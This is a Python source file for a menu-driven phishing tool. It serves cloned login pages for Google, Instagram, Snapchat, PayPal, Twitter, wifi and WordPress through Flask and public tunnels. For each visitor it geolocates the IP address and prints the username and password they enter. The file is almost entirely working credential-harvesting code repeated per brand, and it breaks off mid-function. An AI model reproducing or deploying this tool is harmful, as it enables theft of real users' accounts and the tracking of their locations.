#!/usr/bin/python3
#this project is coded and build by msfcode (instagram)
#Do not use it without asking persmissions
#this tool is build for educational purpose
#respect copyrights©
#the project start 21/08/2021
#if you have any idea or project 
#contact msfcode at instagram page
# https://www.instagram.com
#if you have any issues
#This tool is build using python3
import os
import sys
import requests
from flask import Flask
from flask import render_template
from flask import request
import geocoder
import subprocess
print('\u001b[1m')
print('''    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO      \u001b[31;1mphishing   \u001b[37m'"OOOOOOOOOOOOOOOO"`  \u001b[31;1mTool          \u001b[37moOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
                              :
                           \u001b[31;1m𝕍\u001b[37m.\u001b[31;1m𝟙\u001b[37m.\u001b[31;1m𝟘\u001b[37m.\u001b[31;1m𝟙 \u001b[37m𝕓𝕪 \u001b[31;1m𝕞𝕤𝕗𝕔𝕠𝕕𝕖
''')
while True:
	start = input('''\u001b[37m┌──\u001b[37;1m(\u001b[31;1mSET💀\u001b[31;1mmphish\u001b[37m)\u001b[37m
└─\u001b[37m>>\u001b[37m ''')
	print('')
	if start == 'help':
		print('      help         server')
		print('')
		print('      clear')
		print('')
		print('      exit')
		print('')
		print('      start')
		print('')
	if start == 'server':
		print(''' 
           [1] Ngrok  [2] Localrun

			''')
		settings = int(input('\u001b[31;1mchoice >>\u001b[37m '))
		PORTS = int(input('\u001b[31;1mPort >>\u001b[37m '))
		if settings == 1:
			IS_NGROK_INSTALLED = input('is ngrok installed[y/n] >> ')
			if IS_NGROK_INSTALLED == 'y':
				print('OK')
				subprocess.call('./ngrok http ' + str(PORTS), shell=True)
			if IS_NGROK_INSTALLED == 'n':
				subprocess.call('unzip ngrok-stable-linux-amd64.zip', shell=True)
				subprocess.call('./ngrok http ' + str(PORTS), shell=True)
		if settings == 2:
			subprocess.call('ssh-keygen',shell=True)
			subprocess.call('ssh -R 80:localhost:' + str(PORTS) + ' localhost.run', shell=True)

	if start == 'clear':
		os.system('clear')
	if start == 'exit':
		break
	if start == 'start':
		print('\u001b[1m')
		print('            \u001b[31;1m[\u001b[37m1\u001b[31;1m] \u001b[37mgoogle                       \u001b[31;1m[\u001b[37m7\u001b[31;1m] \u001b[37mwordpress                       \u001b[31;1m[\u001b[37m13\u001b[31;1m] \u001b[37mVerizon')
		print('')
		print('            \u001b[31;1m[\u001b[37m2\u001b[31;1m] \u001b[37minstagram                    \u001b[31;1m[\u001b[37m8\u001b[31;1m] \u001b[37mspotify')
		print('')
		print('            \u001b[31;1m[\u001b[37m3\u001b[31;1m] \u001b[37msnapchat                     \u001b[31;1m[\u001b[37m9\u001b[31;1m] \u001b[37mnetflix')
		print('')
		print('            \u001b[31;1m[\u001b[37m4\u001b[31;1m] \u001b[37mpaypal                       \u001b[31;1m[\u001b[37m10\u001b[31;1m] \u001b[37mVK')
		print('')
		print('            \u001b[31;1m[\u001b[37m5\u001b[31;1m] \u001b[37mtwitter                      \u001b[31;1m[\u001b[37m11\u001b[31;1m] \u001b[37myahoo')
		print('')
		print('            \u001b[31;1m[\u001b[37m6\u001b[31;1m] \u001b[37mwifi                         \u001b[31;1m[\u001b[37m12\u001b[31;1m] \u001b[37mamazon')
		print('')
		print('YOU HAVE TO START THE SAME PROCESS TWICE TO RUN THE PHISHING ATTACK')
		start_input = int(input('\u001b[31;1mchoice >>\u001b[37m '))
		print('')
		START_PORT = int(input('\u001b[31;1mPort >>\u001b[37m '))
		if start_input == 1:
			google = Flask(__name__)
			@google.route('/')
			def google_index():
				return render_template('.sites/google/index.html')
			@google.route('/', methods=['POST','GET'])
			def get_google_data():
				#part 1 of the process
				#get some information about the targets
				if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
					local_addr = request.environ['REMOTE_ADDR']
					print('\u001b[37m---------------------------------------')
					print('\u001b[31;1mLocal IP ADDR >> \u001b[37m' + local_addr)
					print('')
					print('\u001b[31;1mNB : you will not get any other information, before PortForwading')
				else:
					print('\u001b[37m---------------------------------------')
					FORWARDED_ADDR =request.environ['HTTP_X_FORWARDED_FOR']
					print('\u001b[31;1mIP ADDR >> \u001b[37m' +FORWARDED_ADDR)
					URL = f'http://ip-api.com/json/{FORWARDED_ADDR}'
					URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK = requests.get(URL)
					JSON_FORMAT = URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK.json()
					status_word = '\u001b[31;1mSTATUS >> \u001b[37m'
					country_word = '\u001b[31;1mCOUNTRY >> \u001b[37m'
					countryCode_word = '\u001b[31;1mCountryCode >> \u001b[37m'
					region_word = '\u001b[31;1mREGION >> \u001b[37m'
					regionName_word = '\u001b[31;1mRegionName >> \u001b[37m'
					city_word = '\u001b[31;1mCITY >> \u001b[37m'
					timezone_word = '\u001b[31;1mTIMEZONE >> \u001b[37m'
					isp_word = '\u001b[31;1mISP >> \u001b[37m'
					org_word = '\u001b[31;1mORG >> \u001b[37m'
					as_word = '\u001b[31;1mAS >> \u001b[37m'
					status = JSON_FORMAT['status']
					def status_print():
					 print(status_word + status)
					status_print()
					country = JSON_FORMAT['country']
					def country_print():
					 print(country_word + country)
					country_print()
					countryCode = JSON_FORMAT['countryCode']
					def countryCode_print():
						print(countryCode_word + countryCode)
					countryCode_print()
					region = JSON_FORMAT['region']
					def REGION_PRINT():
						print(region_word + region)
					REGION_PRINT()
					regionName = JSON_FORMAT['regionName']
					def regionName_print():
						print(regionName_word + regionName)
					regionName_print()
					city = JSON_FORMAT['city']
					def city_print():
						print(city_word + city)
					city_print()
					zip_code = JSON_FORMAT['zip']
					def zip_code():
						print('\u001b[31;1mZIP >> \u001b[37m' + str(zip_code))
					zip_code()
					timezone = JSON_FORMAT['timezone']
					def timezone_print():
						print(timezone_word + timezone)
					timezone_print()
					isp = JSON_FORMAT['isp']
					def isp_print():
						print(isp_word + isp)
					isp_print()
					org = JSON_FORMAT['org']
					def org_print():
						print(org_word+ org)
					org_print()
					as_code = JSON_FORMAT['as']
					def as_code_PRINT():
						print(as_word + as_code)
					as_code_PRINT()
					def GET_LATLNG():
						VICTIM_IP_ADDR = f'{FORWARDED_ADDR}'
						IP_LAT = geocoder.ip(VICTIM_IP_ADDR).lat
						print('\u001b[31;1mLATITUDE >> \u001b[37m\u001b[37m' + str(IP_LAT))
						IP_LNG = geocoder.ip(VICTIM_IP_ADDR).lng
						print('\u001b[31;1mLONGITUDE >> \u001b[37m' + str(IP_LNG))
					GET_LATLNG()

				#part 2 of the process
				#get the username and password
				google_colr_user = '\u001b[31;1m'
				google_colr_pass = '\u001b[31;1m'
				google_word_user = 'username: '
				google_word_pass = 'password: '
				google_words_user = google_colr_user + google_word_user
				google_words_pass = google_colr_pass + google_word_pass
				second_usr = '\u001b[37m'
				second_pass = '\u001b[37m'
				space_usr = '# '
				space_pass = '# '
				username = request.form['username']
				password = request.form['password']
				print('\u001b[37m---------------------------------------')
				print(space_pass+google_words_user + second_usr +username)
				print('#')
				print(space_pass + google_words_pass + second_pass +password)	
				print('---------------------------------------')
				return render_template('pass.html')
			if __name__ == ('__main__'):
				google.run(debug=True, port=START_PORT)
		if start_input == 2:
			instagram = Flask(__name__)
			@instagram.route('/')
			def instagram_index():
				return render_template('.sites/instagram/index.html')
			@instagram.route('/', methods=['POST','GET'])
			def get_instagram_data():
				#part 1 of the process
				#get some information about the targets
				if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
					local_addr = request.environ['REMOTE_ADDR']
					print('\u001b[37m---------------------------------------')
					print('\u001b[31;1mLocal IP ADDR >> \u001b[37m' + local_addr)
					print('')
					print('\u001b[31;1mNB : you will not get any other information, before PortForwading')
				else:
					print('\u001b[37m---------------------------------------')
					FORWARDED_ADDR =request.environ['HTTP_X_FORWARDED_FOR']
					print('\u001b[31;1mIP ADDR >> \u001b[37m' +FORWARDED_ADDR)
					URL = f'http://ip-api.com/json/{FORWARDED_ADDR}'
					URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK = requests.get(URL)
					JSON_FORMAT = URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK.json()
					status_word = '\u001b[31;1mSTATUS >> \u001b[37m'
					country_word = '\u001b[31;1mCOUNTRY >> \u001b[37m'
					countryCode_word = '\u001b[31;1mCountryCode >> \u001b[37m'
					region_word = '\u001b[31;1mREGION >> \u001b[37m'
					regionName_word = '\u001b[31;1mRegionName >> \u001b[37m'
					city_word = '\u001b[31;1mCITY >> \u001b[37m'
					timezone_word = '\u001b[31;1mTIMEZONE >> \u001b[37m'
					isp_word = '\u001b[31;1mISP >> \u001b[37m'
					org_word = '\u001b[31;1mORG >> \u001b[37m'
					as_word = '\u001b[31;1mAS >> \u001b[37m'
					status = JSON_FORMAT['status']
					def status_print():
					 print(status_word + status)
					status_print()
					country = JSON_FORMAT['country']
					def country_print():
					 print(country_word + country)
					country_print()
					countryCode = JSON_FORMAT['countryCode']
					def countryCode_print():
						print(countryCode_word + countryCode)
					countryCode_print()
					region = JSON_FORMAT['region']
					def REGION_PRINT():
						print(region_word + region)
					REGION_PRINT()
					regionName = JSON_FORMAT['regionName']
					def regionName_print():
						print(regionName_word + regionName)
					regionName_print()
					city = JSON_FORMAT['city']
					def city_print():
						print(city_word + city)
					city_print()
					zip_code = JSON_FORMAT['zip']
					def zip_code():
						print('\u001b[31;1mZIP >> \u001b[37m' + str(zip_code))
					zip_code()
					timezone = JSON_FORMAT['timezone']
					def timezone_print():
						print(timezone_word + timezone)
					timezone_print()
					isp = JSON_FORMAT['isp']
					def isp_print():
						print(isp_word + isp)
					isp_print()
					org = JSON_FORMAT['org']
					def org_print():
						print(org_word+ org)
					org_print()
					as_code = JSON_FORMAT['as']
					def as_code_PRINT():
						print(as_word + as_code)
					as_code_PRINT()
					def GET_LATLNG():
						VICTIM_IP_ADDR = f'{FORWARDED_ADDR}'
						IP_LAT = geocoder.ip(VICTIM_IP_ADDR).lat
						print('\u001b[31;1mLATITUDE >> \u001b[37m\u001b[37m' + str(IP_LAT))
						IP_LNG = geocoder.ip(VICTIM_IP_ADDR).lng
						print('\u001b[31;1mLONGITUDE >> \u001b[37m' + str(IP_LNG))
					GET_LATLNG()


				#part 2 of the process
				#get the username and password
				instagram_colr_user = '\u001b[31;1m'
				instagram_colr_pass = '\u001b[31;1m'
				instagram_word_user = 'username: '
				instagram_word_pass = 'password: '
				instagram_words_user = instagram_colr_user + instagram_word_user
				instagram_words_pass = instagram_colr_pass + instagram_word_pass
				second_usr = '\u001b[37m'
				second_pass = '\u001b[37m'
				space_usr = '# '
				space_pass = '# '
				username = request.form['username']
				password = request.form['password']
				print('\u001b[37m---------------------------------------')
				print(space_pass+instagram_words_user + second_usr +username)
				print('#')
				print(space_pass + instagram_words_pass + second_pass +password)	
				print('---------------------------------------')
				return render_template('pass.html')
			if __name__ == ('__main__'):
				instagram.run(debug=True, port=START_PORT)
		if start_input == 3:
			snapchat = Flask(__name__)
			@snapchat.route('/')
			def snapchat_index():
				return render_template('.sites/snapchat/index.html')
			@snapchat.route('/', methods=['POST','GET'])
			def get_snapchat_data():
				#part 1 of the process
				#get some information about the targets
				if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
					local_addr = request.environ['REMOTE_ADDR']
					print('\u001b[37m---------------------------------------')
					print('\u001b[31;1mLocal IP ADDR >> \u001b[37m' + local_addr)
					print('')
					print('\u001b[31;1mNB : you will not get any other information, before PortForwading')
				else:
					print('\u001b[37m---------------------------------------')
					FORWARDED_ADDR =request.environ['HTTP_X_FORWARDED_FOR']
					print('\u001b[31;1mIP ADDR >> \u001b[37m' +FORWARDED_ADDR)
					URL = f'http://ip-api.com/json/{FORWARDED_ADDR}'
					URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK = requests.get(URL)
					JSON_FORMAT = URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK.json()
					status_word = '\u001b[31;1mSTATUS >> \u001b[37m'
					country_word = '\u001b[31;1mCOUNTRY >> \u001b[37m'
					countryCode_word = '\u001b[31;1mCountryCode >> \u001b[37m'
					region_word = '\u001b[31;1mREGION >> \u001b[37m'
					regionName_word = '\u001b[31;1mRegionName >> \u001b[37m'
					city_word = '\u001b[31;1mCITY >> \u001b[37m'
					timezone_word = '\u001b[31;1mTIMEZONE >> \u001b[37m'
					isp_word = '\u001b[31;1mISP >> \u001b[37m'
					org_word = '\u001b[31;1mORG >> \u001b[37m'
					as_word = '\u001b[31;1mAS >> \u001b[37m'
					status = JSON_FORMAT['status']
					def status_print():
					 print(status_word + status)
					status_print()
					country = JSON_FORMAT['country']
					def country_print():
					 print(country_word + country)
					country_print()
					countryCode = JSON_FORMAT['countryCode']
					def countryCode_print():
						print(countryCode_word + countryCode)
					countryCode_print()
					region = JSON_FORMAT['region']
					def REGION_PRINT():
						print(region_word + region)
					REGION_PRINT()
					regionName = JSON_FORMAT['regionName']
					def regionName_print():
						print(regionName_word + regionName)
					regionName_print()
					city = JSON_FORMAT['city']
					def city_print():
						print(city_word + city)
					city_print()
					zip_code = JSON_FORMAT['zip']
					def zip_code():
						print('\u001b[31;1mZIP >> \u001b[37m' + str(zip_code))
					zip_code()
					timezone = JSON_FORMAT['timezone']
					def timezone_print():
						print(timezone_word + timezone)
					timezone_print()
					isp = JSON_FORMAT['isp']
					def isp_print():
						print(isp_word + isp)
					isp_print()
					org = JSON_FORMAT['org']
					def org_print():
						print(org_word+ org)
					org_print()
					as_code = JSON_FORMAT['as']
					def as_code_PRINT():
						print(as_word + as_code)
					as_code_PRINT()
					def GET_LATLNG():
						VICTIM_IP_ADDR = f'{FORWARDED_ADDR}'
						IP_LAT = geocoder.ip(VICTIM_IP_ADDR).lat
						print('\u001b[31;1mLATITUDE >> \u001b[37m\u001b[37m' + str(IP_LAT))
						IP_LNG = geocoder.ip(VICTIM_IP_ADDR).lng
						print('\u001b[31;1mLONGITUDE >> \u001b[37m' + str(IP_LNG))
					GET_LATLNG()


				#part 2 of the process
				#get the username and password
				snapchat_colr_user = '\u001b[31;1m'
				snapchat_colr_pass = '\u001b[31;1m'
				snapchat_word_user = 'username: '
				snapchat_word_pass = 'password: '
				snapchat_words_user = snapchat_colr_user + snapchat_word_user
				snapchat_words_pass = snapchat_colr_pass + snapchat_word_pass
				second_usr = '\u001b[37m'
				second_pass = '\u001b[37m'
				space_usr = '# '
				space_pass = '# '
				username = request.form['username']
				password = request.form['password']
				print('\u001b[37m---------------------------------------')
				print(space_pass + snapchat_words_user + second_usr +username)
				print('#')
				print(space_pass + snapchat_words_pass + second_pass +password)	
				print('---------------------------------------')
				return render_template('pass.html')
			if __name__ == ('__main__'):
				snapchat.run(debug=True, port=START_PORT)
		if start_input == 4:
			paypal = Flask(__name__)
			@paypal.route('/')
			def paypal_index():
				return render_template('.sites/paypal/index.html')
			@paypal.route('/', methods=['POST','GET'])
			def get_paypal_data():
				#part 1 of the process
				#get some information about the targets
				if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
					local_addr = request.environ['REMOTE_ADDR']
					print('\u001b[37m---------------------------------------')
					print('\u001b[31;1mLocal IP ADDR >> \u001b[37m' + local_addr)
					print('')
					print('\u001b[31;1mNB : you will not get any other information, before PortForwading')
				else:
					print('\u001b[37m---------------------------------------')
					FORWARDED_ADDR =request.environ['HTTP_X_FORWARDED_FOR']
					print('\u001b[31;1mIP ADDR >> \u001b[37m' +FORWARDED_ADDR)
					URL = f'http://ip-api.com/json/{FORWARDED_ADDR}'
					URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK = requests.get(URL)
					JSON_FORMAT = URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK.json()
					status_word = '\u001b[31;1mSTATUS >> \u001b[37m'
					country_word = '\u001b[31;1mCOUNTRY >> \u001b[37m'
					countryCode_word = '\u001b[31;1mCountryCode >> \u001b[37m'
					region_word = '\u001b[31;1mREGION >> \u001b[37m'
					regionName_word = '\u001b[31;1mRegionName >> \u001b[37m'
					city_word = '\u001b[31;1mCITY >> \u001b[37m'
					timezone_word = '\u001b[31;1mTIMEZONE >> \u001b[37m'
					isp_word = '\u001b[31;1mISP >> \u001b[37m'
					org_word = '\u001b[31;1mORG >> \u001b[37m'
					as_word = '\u001b[31;1mAS >> \u001b[37m'
					status = JSON_FORMAT['status']
					def status_print():
					 print(status_word + status)
					status_print()
					country = JSON_FORMAT['country']
					def country_print():
					 print(country_word + country)
					country_print()
					countryCode = JSON_FORMAT['countryCode']
					def countryCode_print():
						print(countryCode_word + countryCode)
					countryCode_print()
					region = JSON_FORMAT['region']
					def REGION_PRINT():
						print(region_word + region)
					REGION_PRINT()
					regionName = JSON_FORMAT['regionName']
					def regionName_print():
						print(regionName_word + regionName)
					regionName_print()
					city = JSON_FORMAT['city']
					def city_print():
						print(city_word + city)
					city_print()
					zip_code = JSON_FORMAT['zip']
					def zip_code():
						print('\u001b[31;1mZIP >> \u001b[37m' + str(zip_code))
					zip_code()
					timezone = JSON_FORMAT['timezone']
					def timezone_print():
						print(timezone_word + timezone)
					timezone_print()
					isp = JSON_FORMAT['isp']
					def isp_print():
						print(isp_word + isp)
					isp_print()
					org = JSON_FORMAT['org']
					def org_print():
						print(org_word+ org)
					org_print()
					as_code = JSON_FORMAT['as']
					def as_code_PRINT():
						print(as_word + as_code)
					as_code_PRINT()
					def GET_LATLNG():
						VICTIM_IP_ADDR = f'{FORWARDED_ADDR}'
						IP_LAT = geocoder.ip(VICTIM_IP_ADDR).lat
						print('\u001b[31;1mLATITUDE >> \u001b[37m\u001b[37m' + str(IP_LAT))
						IP_LNG = geocoder.ip(VICTIM_IP_ADDR).lng
						print('\u001b[31;1mLONGITUDE >> \u001b[37m' + str(IP_LNG))
					GET_LATLNG()

				#part 2 of the process
				#get the username and password
				paypal_colr_user = '\u001b[31;1m'
				paypal_colr_pass = '\u001b[31;1m'
				paypal_word_user = 'username: '
				paypal_word_pass = 'password: '
				paypal_words_user = paypal_colr_user + paypal_word_user
				paypal_words_pass = paypal_colr_pass + paypal_word_pass
				second_usr = '\u001b[37m'
				second_pass = '\u001b[37m'
				space_usr = '# '
				space_pass = '# '
				username = request.form['username']
				password = request.form['password']
				print('\u001b[37m---------------------------------------')
				print(space_pass + paypal_words_user + second_usr +username)
				print('#')
				print(space_pass + paypal_words_pass + second_pass +password)	
				print('---------------------------------------')
				return render_template('pass.html')
			if __name__ == ('__main__'):
				paypal.run(debug=True, port=START_PORT)
		if start_input == 5:
			twitter = Flask(__name__)
			@twitter.route('/')
			def twitter_index():
				return render_template('.sites/twitter/index.html')
			@twitter.route('/', methods=['POST','GET'])
			def get_twitter_data():
				#part 1 of the process
				#get some information about the targets
				if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
					local_addr = request.environ['REMOTE_ADDR']
					print('\u001b[37m---------------------------------------')
					print('\u001b[31;1mLocal IP ADDR >> \u001b[37m' + local_addr)
					print('')
					print('\u001b[31;1mNB : you will not get any other information, before PortForwading')
				else:
					print('\u001b[37m---------------------------------------')
					FORWARDED_ADDR =request.environ['HTTP_X_FORWARDED_FOR']
					print('\u001b[31;1mIP ADDR >> \u001b[37m' +FORWARDED_ADDR)
					URL = f'http://ip-api.com/json/{FORWARDED_ADDR}'
					URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK = requests.get(URL)
					JSON_FORMAT = URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK.json()
					status_word = '\u001b[31;1mSTATUS >> \u001b[37m'
					country_word = '\u001b[31;1mCOUNTRY >> \u001b[37m'
					countryCode_word = '\u001b[31;1mCountryCode >> \u001b[37m'
					region_word = '\u001b[31;1mREGION >> \u001b[37m'
					regionName_word = '\u001b[31;1mRegionName >> \u001b[37m'
					city_word = '\u001b[31;1mCITY >> \u001b[37m'
					timezone_word = '\u001b[31;1mTIMEZONE >> \u001b[37m'
					isp_word = '\u001b[31;1mISP >> \u001b[37m'
					org_word = '\u001b[31;1mORG >> \u001b[37m'
					as_word = '\u001b[31;1mAS >> \u001b[37m'
					status = JSON_FORMAT['status']
					def status_print():
					 print(status_word + status)
					status_print()
					country = JSON_FORMAT['country']
					def country_print():
					 print(country_word + country)
					country_print()
					countryCode = JSON_FORMAT['countryCode']
					def countryCode_print():
						print(countryCode_word + countryCode)
					countryCode_print()
					region = JSON_FORMAT['region']
					def REGION_PRINT():
						print(region_word + region)
					REGION_PRINT()
					regionName = JSON_FORMAT['regionName']
					def regionName_print():
						print(regionName_word + regionName)
					regionName_print()
					city = JSON_FORMAT['city']
					def city_print():
						print(city_word + city)
					city_print()
					zip_code = JSON_FORMAT['zip']
					def zip_code():
						print('\u001b[31;1mZIP >> \u001b[37m' + str(zip_code))
					zip_code()
					timezone = JSON_FORMAT['timezone']
					def timezone_print():
						print(timezone_word + timezone)
					timezone_print()
					isp = JSON_FORMAT['isp']
					def isp_print():
						print(isp_word + isp)
					isp_print()
					org = JSON_FORMAT['org']
					def org_print():
						print(org_word+ org)
					org_print()
					as_code = JSON_FORMAT['as']
					def as_code_PRINT():
						print(as_word + as_code)
					as_code_PRINT()
					def GET_LATLNG():
						VICTIM_IP_ADDR = f'{FORWARDED_ADDR}'
						IP_LAT = geocoder.ip(VICTIM_IP_ADDR).lat
						print('\u001b[31;1mLATITUDE >> \u001b[37m\u001b[37m' + str(IP_LAT))
						IP_LNG = geocoder.ip(VICTIM_IP_ADDR).lng
						print('\u001b[31;1mLONGITUDE >> \u001b[37m' + str(IP_LNG))
					GET_LATLNG()

				#part 2 of the process
				#get the username and password
				twitter_colr_user = '\u001b[31;1m'
				twitter_colr_pass = '\u001b[31;1m'
				twitter_word_user = 'username: '
				twitter_word_pass = 'password: '
				twitter_words_user = twitter_colr_user + twitter_word_user
				twitter_words_pass = twitter_colr_pass + twitter_word_pass
				second_usr = '\u001b[37m'
				second_pass = '\u001b[37m'
				space_usr = '# '
				space_pass = '# '
				username = request.form['username']
				password = request.form['password']
				print('\u001b[37m---------------------------------------')
				print(space_pass + twitter_words_user + second_usr +username)
				print('#')
				print(space_pass + twitter_words_pass + second_pass +password)	
				print('---------------------------------------')
				return render_template('pass.html')
			if __name__ == ('__main__'):
				twitter.run(debug=True, port=START_PORT)
		if start_input == 6:
			wifi = Flask(__name__)
			@wifi.route('/')
			def wifi_index():
				return render_template('.sites/wifi/index.html')
			@wifi.route('/', methods=['POST','GET'])
			def get__data():
				#part 1 of the process
				#get some information about the targets
				if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
					local_addr = request.environ['REMOTE_ADDR']
					print('\u001b[37m---------------------------------------')
					print('\u001b[31;1mLocal IP ADDR >> \u001b[37m' + local_addr)
					print('')
					print('\u001b[31;1mNB : you will not get any other information, before PortForwading')
				else:
					print('\u001b[37m---------------------------------------')
					FORWARDED_ADDR =request.environ['HTTP_X_FORWARDED_FOR']
					print('\u001b[31;1mIP ADDR >> \u001b[37m' +FORWARDED_ADDR)
					URL = f'http://ip-api.com/json/{FORWARDED_ADDR}'
					URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK = requests.get(URL)
					JSON_FORMAT = URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK.json()
					status_word = '\u001b[31;1mSTATUS >> \u001b[37m'
					country_word = '\u001b[31;1mCOUNTRY >> \u001b[37m'
					countryCode_word = '\u001b[31;1mCountryCode >> \u001b[37m'
					region_word = '\u001b[31;1mREGION >> \u001b[37m'
					regionName_word = '\u001b[31;1mRegionName >> \u001b[37m'
					city_word = '\u001b[31;1mCITY >> \u001b[37m'
					timezone_word = '\u001b[31;1mTIMEZONE >> \u001b[37m'
					isp_word = '\u001b[31;1mISP >> \u001b[37m'
					org_word = '\u001b[31;1mORG >> \u001b[37m'
					as_word = '\u001b[31;1mAS >> \u001b[37m'
					status = JSON_FORMAT['status']
					def status_print():
					 print(status_word + status)
					status_print()
					country = JSON_FORMAT['country']
					def country_print():
					 print(country_word + country)
					country_print()
					countryCode = JSON_FORMAT['countryCode']
					def countryCode_print():
						print(countryCode_word + countryCode)
					countryCode_print()
					region = JSON_FORMAT['region']
					def REGION_PRINT():
						print(region_word + region)
					REGION_PRINT()
					regionName = JSON_FORMAT['regionName']
					def regionName_print():
						print(regionName_word + regionName)
					regionName_print()
					city = JSON_FORMAT['city']
					def city_print():
						print(city_word + city)
					city_print()
					zip_code = JSON_FORMAT['zip']
					def zip_code():
						print('\u001b[31;1mZIP >> \u001b[37m' + str(zip_code))
					zip_code()
					timezone = JSON_FORMAT['timezone']
					def timezone_print():
						print(timezone_word + timezone)
					timezone_print()
					isp = JSON_FORMAT['isp']
					def isp_print():
						print(isp_word + isp)
					isp_print()
					org = JSON_FORMAT['org']
					def org_print():
						print(org_word+ org)
					org_print()
					as_code = JSON_FORMAT['as']
					def as_code_PRINT():
						print(as_word + as_code)
					as_code_PRINT()
					def GET_LATLNG():
						VICTIM_IP_ADDR = f'{FORWARDED_ADDR}'
						IP_LAT = geocoder.ip(VICTIM_IP_ADDR).lat
						print('\u001b[31;1mLATITUDE >> \u001b[37m\u001b[37m' + str(IP_LAT))
						IP_LNG = geocoder.ip(VICTIM_IP_ADDR).lng
						print('\u001b[31;1mLONGITUDE >> \u001b[37m' + str(IP_LNG))
					GET_LATLNG()

				#part 2 of the process
				#get the username and password
				wifi_colr_user = '\u001b[31;1m'
				wifi_colr_pass = '\u001b[31;1m'
				wifi_word_user = 'username: '
				wifi_word_pass = 'password: '
				wifi_words_user = wifi_colr_user + wifi_word_user
				wifi_words_pass = wifi_colr_pass + wifi_word_pass
				second_usr = '\u001b[37m'
				second_pass = '\u001b[37m'
				space_usr = '# '
				space_pass = '# '
				username = request.form['username']
				password = request.form['password']
				print('\u001b[37m---------------------------------------')
				print(space_pass + wifi_words_user + second_usr +username)
				print('#')
				print(space_pass +wifi_words_pass + second_pass +password)	
				print('---------------------------------------')
				return render_template('pass.html')
			if __name__ == ('__main__'):
				wifi.run(debug=True, port=START_PORT)
		if start_input == 7:
			shopping = Flask(__name__)
			@shopping.route('/')
			def shopping_index():
				return render_template('.sites/wordpress/test.html')
			@shopping.route('/', methods=['POST','GET'])
			def get__data():
				#part 1 of the process
				#get some information about the targets
				if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
					local_addr = request.environ['REMOTE_ADDR']
					print('\u001b[37m---------------------------------------')
					print('\u001b[31;1mLocal IP ADDR >> \u001b[37m' + local_addr)
					print('')
					print('\u001b[31;1mNB : you will not get any other information, before PortForwading')
				else:
					print('\u001b[37m---------------------------------------')
					FORWARDED_ADDR =request.environ['HTTP_X_FORWARDED_FOR']
					print('\u001b[31;1mIP ADDR >> \u001b[37m' +FORWARDED_ADDR)
					URL = f'http://ip-api.com/json/{FORWARDED_ADDR}'
					URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK = requests.get(URL)
					JSON_FORMAT = URLS_INFORMATION_EXTRACTED_FROM_IPAPI_LINK.json()
					status_word = '\u001b[31;1mSTATUS >> \u001b[37m'
					country_word = '\u001b[31;1mCOUNTRY >> \u001b[37m'
					countryCode_word = '\u001b[31;1mCountryCode >> \u001b[37m'
					region_word = '\u001b[31;1mREGION >> \u001b[37m'
					regionName_word = '\u001b[31;1mRegionName >> \u001b[37m'
					city_word = '\u001b[31;1mCITY >> \u001b[37m'
					timezone_word = '\u001b[31;1mTIMEZONE >> \u001b[37m'
					isp_word = '\u001b[31;1mISP >> \u001b[37m'
					org_word = '\u001b[31;1mORG >> \u001b[37m'
					as_word = '\u001b[31;1mAS >> \u001b[37m'
					status = JSON_FORMAT['status']
					def status_print():
					 print(status_word + status)
					status_print()
					country = JSON_FORMAT['country']
					def country_print():
					 print(country_word + country)
					country_print()
					countryCode = JSON_FORMAT['countryCode']
					def countryCode_print():
						print(countryCode_word + countryCode)
					countryCode_print()
					region = JSON_FORMAT['region']
					def REGION_PRINT():
						print(region_word + region)
					REGION_PRINT()
					regionName = JSON_FORMAT['regionName']
					def regionName_print():
						print(regionName_word + regionName)
					regionName_print()
					city = JSON_FORMAT['city']
					def city_print():
						print(city_word + city)
					city_print()
					zip_code = JSON_FORMAT['zip']
					def zip_code():
						print('\u001b[31;1mZIP >> \u001b[37m' + str(zip_code))
					zip_code()
					timezone = JSON_FORMAT['timezone']
					def timezone_print():
						print(timezone_word + timezone)
					timezone_print()
					isp = JSON_FORMAT['isp']
					def isp_print():
						print(isp_word + isp)
					isp_print()
					org = JSON_FORMAT['org']
					def org_print():
						print(org_word+ org)
					org_print()
					as_code = JSON_FORMAT['as']
					def as_code_PRINT():
